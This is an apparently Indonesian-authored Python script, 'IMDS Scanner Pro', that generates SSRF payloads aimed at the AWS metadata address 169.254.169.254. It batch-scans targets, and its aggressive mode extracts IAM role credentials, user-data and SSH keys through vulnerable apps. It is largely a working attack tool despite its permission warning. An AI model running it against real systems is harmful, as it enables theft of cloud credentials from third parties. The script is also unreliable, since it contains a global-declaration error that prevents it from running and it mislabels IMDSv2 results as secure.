#!/usr/bin/env python3
"""
IMDS Scanner Pro - AWS Instance Metadata Service (IMDSv1/v2) Vulnerability Checker
Upgraded Edition - 2025
Fitur:
- Deteksi akurat IMDSv1 vs IMDSv2
- Support multiple SSRF vector (query, path, header)
- Batch scanning dari file
- Proxy support
- JSON export + summary report
- Safe & aggressive mode
Usage:
    python3 imds_scanner.py -u "https://example.com/fetch?url=http://169.254.169.254"
    python3 imds_scanner.py -f targets.txt --aggressive
"""

import argparse
import json
import os
import sys
import time
from urllib.parse import urljoin, urlparse, quote

import requests
from colorama import Fore, Style, init

init(autoreset=True)

# ===================== CONFIG =====================
TIMEOUT = 8
HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; IMDS-Scanner/2025)"}

# Common SSRF parameter names
SSRF_PARAMS = ["url", "u", "link", "src", "r", "redirect", "next", "uri", "path", "destination", "file", "image"]

# Common IMDS endpoints untuk test
IMDS_ENDPOINTS = [
    "/latest/meta-data/instance-id",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/user-data",
    "/latest/meta-data/public-keys/0/openssh-key"
]

# ===================== BANNER =====================
def banner():
    print(Fore.CYAN + r"""
  ___ __ __ ___ ___ ___
 |_ _| \/ | \/ __|/ __|
  | || |\/| | |) \__ \ (__
 |___|_| |_|___/|___/\___|
                          
        IMDSv1/v2 Vulnerability Scanner
                Upgraded Edition - 2025
    """ + Style.RESET_ALL)

# ===================== CORE FUNCTIONS =====================
def test_imds_direct(base_url, session, endpoint="/latest/meta-data/instance-id", extra_headers=None):
    try:
        url = urljoin(base_url + "/", endpoint.lstrip("/"))
        headers = HEADERS.copy()
        if extra_headers:
            headers.update(extra_headers)
        r = session.get(url, timeout=TIMEOUT, headers=headers)
        return r
    except Exception:
        return None

def test_imdsv2_token(base_url, session):
    try:
        token_url = urljoin(base_url + "/", "latest/api/token")
        r = session.put(
            token_url,
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            timeout=TIMEOUT
        )
        return r
    except:
        return None

def build_ssrf_urls(base_target, imds_base="http://169.254.169.254"):
    urls = []
    # 1. Query parameter variations
    for param in SSRF_PARAMS:
        urls.append(f"{base_target}?{param}={quote(imds_base)}")
        urls.append(f"{base_target}?{param}={quote(imds_base + '/latest/meta-data/instance-id')}")
    
    # 2. Path-based SSRF
    paths = [
        f"{base_target.rstrip('/')}/{quote(imds_base.lstrip('http://'))}",
        f"{base_target.rstrip('/')}/fetch/{imds_base.lstrip('http://')}",
        f"{base_target.rstrip('/')}/proxy/{imds_base.lstrip('http://')}"
    ]
    urls.extend(paths)
    
    # 3. Full URL redirect style
    urls.append(f"{base_target}{quote(imds_base)}")
    
    return list(set(urls))  # deduplicate

def scan_target(target, aggressive=False, proxy=None):
    result = {
        "target": target,
        "imds_accessible": False,
        "imds_version": "unknown",
        "token_required": False,
        "findings": [],
        "status": "failed"
    }
    
    proxies = {"http": proxy, "https": proxy} if proxy else None
    session = requests.Session()
    session.proxies.update(proxies or {})
    
    print(f"{Fore.YELLOW}[*] Scanning: {target}{Style.RESET_ALL}")
    
    # Jika target langsung ke IMDS (untuk testing internal)
    if "169.254.169.254" in target:
        base = target
    else:
        base_candidates = build_ssrf_urls(target)
        if not base_candidates:
            print(f"{Fore.RED}[-] Tidak bisa generate SSRF vector{Style.RESET_ALL}")
            result["status"] = "no_vector"
            return result
        
        working_base = None
        for candidate in base_candidates:
            print(f" {Fore.CYAN}→ Testing vector: {candidate}{Style.RESET_ALL}")
            test_resp = test_imds_direct(candidate, session)
            if test_resp and test_resp.status_code == 200 and len(test_resp.text.strip()) > 0:
                if "i-" in test_resp.text or "role" in test_resp.text.lower():
                    working_base = candidate
                    result["findings"].append({
                        "type": "ssrf_vector",
                        "url": candidate,
                        "note": "Direct access to IMDS endpoint"
                    })
                    print(f" {Fore.GREEN}[+] SSRF Vector WORK: {candidate}{Style.RESET_ALL}")
                    break
        
        if not working_base:
            print(f"{Fore.RED}[-] Tidak ada SSRF vector yang bekerja{Style.RESET_ALL}")
            result["status"] = "no_ssrf"
            return result
        
        base = working_base
    
    # Test IMDS version
    print(f"{Fore.CYAN}[+] Testing IMDS version via {base}{Style.RESET_ALL}")
    
    # Test IMDSv1 (direct access)
    v1_resp = test_imds_direct(base, session)
    if v1_resp and v1_resp.status_code == 200 and ("i-" in v1_resp.text or "role" in v1_resp.text.lower()):
        result["imds_accessible"] = True
        result["imds_version"] = "IMDSv1 (VULNERABLE)"
        result["findings"].append({
            "type": "imds_v1_vulnerable",
            "evidence": v1_resp.text.strip()[:200],
            "note": "Direct access tanpa token → HIGH RISK"
        })
        print(f"{Fore.RED}[!!!] IMDSv1 ACTIVE & ACCESSIBLE → CRITICAL VULNERABILITY!{Style.RESET_ALL}")
        result["status"] = "vulnerable_imds_v1"
    
    # Test IMDSv2
    token_resp = test_imdsv2_token(base, session)
    if token_resp:
        if token_resp.status_code == 200:
            token = token_resp.text.strip()
            access_resp = test_imds_direct(base, session, extra_headers={"X-aws-ec2-metadata-token": token})
            if access_resp and access_resp.status_code == 200:
                result["token_required"] = True
                result["imds_version"] = "IMDSv2 (SECURE)"
                print(f"{Fore.GREEN}[+] IMDSv2 enforced → Secure configuration{Style.RESET_ALL}")
                result["status"] = "secure_imds_v2"
            else:
                print(f"{Fore.YELLOW}[?] Token diterima tapi access ditolak → Partial protection{Style.RESET_ALL}")
                result["status"] = "partial_protection"
        elif token_resp.status_code == 401:
            print(f"{Fore.GREEN}[+] Token diperlukan dan ditolak → Good protection{Style.RESET_ALL}")
        elif token_resp.status_code == 404:
            print(f"{Fore.YELLOW}[?] IMDSv2 endpoint tidak tersedia{Style.RESET_ALL}")
    
    # Aggressive mode: extract more data if vulnerable
    if aggressive and result["imds_accessible"]:
        print(f"{Fore.MAGENTA}[+] Aggressive mode: Extracting sensitive data...{Style.RESET_ALL}")
        for ep in IMDS_ENDPOINTS[1:]:
            resp = test_imds_direct(base, session, endpoint=ep)
            if resp and resp.status_code == 200 and resp.text.strip():
                result["findings"].append({
                    "type": "data_leak",
                    "endpoint": ep,
                    "data": resp.text.strip()[:500]
                })
                print(f" {Fore.RED}→ Leaked: {ep}{Style.RESET_ALL}")
    
    return result

# ===================== MAIN =====================
def main():
    parser = argparse.ArgumentParser(description="IMDS Scanner Pro - AWS IMDSv1/v2 Vulnerability Checker")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single target URL with SSRF parameter")
    group.add_argument("-f", "--file", help="File berisi list target (satu per baris)")
    parser.add_argument("--aggressive", action="store_true", help="Coba extract data sensitif jika IMDSv1 vulnerable")
    parser.add_argument("--proxy", help="Proxy (contoh: http://127.0.0.1:8080)")
    parser.add_argument("-o", "--output", default="imds_scan_results.json", help="Output JSON file")
    parser.add_argument("--timeout", type=int, default=TIMEOUT, help="Request timeout (detik)")
    
    args = parser.parse_args()
    
    # Perbaikan utama: global declaration sebelum assignment
    global TIMEOUT
    TIMEOUT = args.timeout
    
    banner()
    print(Fore.RED + "[WARNING] Gunakan hanya pada target yang Anda miliki atau memiliki izin eksplisit!\n" + Style.RESET_ALL)
    
    targets = []
    if args.url:
        targets = [args.url]
    elif args.file:
        if not os.path.isfile(args.file):
            print(Fore.RED + f"[!] File tidak ditemukan: {args.file}" + Style.RESET_ALL)
            sys.exit(1)
        with open(args.file, encoding="utf-8") as f:
            targets = [line.strip() for line in f if line.strip()]
    
    results = []
    vulnerable_count = 0
    
    for target in targets:
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        res = scan_target(target, aggressive=args.aggressive, proxy=args.proxy)
        results.append(res)
        if "IMDSv1" in res.get("imds_version", ""):
            vulnerable_count += 1
        print("")  # spacing
    
    # Summary
    print(Fore.CYAN + "="*70)
    print(Fore.GREEN + "SCAN SELESAI - SUMMARY")
    print(Fore.CYAN + "="*70)
    print(f"Total target     : {len(targets)}")
    print(f"IMDSv1 Vulnerable: {Fore.RED}{vulnerable_count}{Style.RESET_ALL}")
    print(f"IMDSv2 Secure    : {len([r for r in results if r['status'] == 'secure_imds_v2'])}")
    print(f"Output disimpan  : {args.output}")
    print(Fore.CYAN + "="*70 + Style.RESET_ALL)
    
    # Save results
    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)

if __name__ == "__main__":
    main()
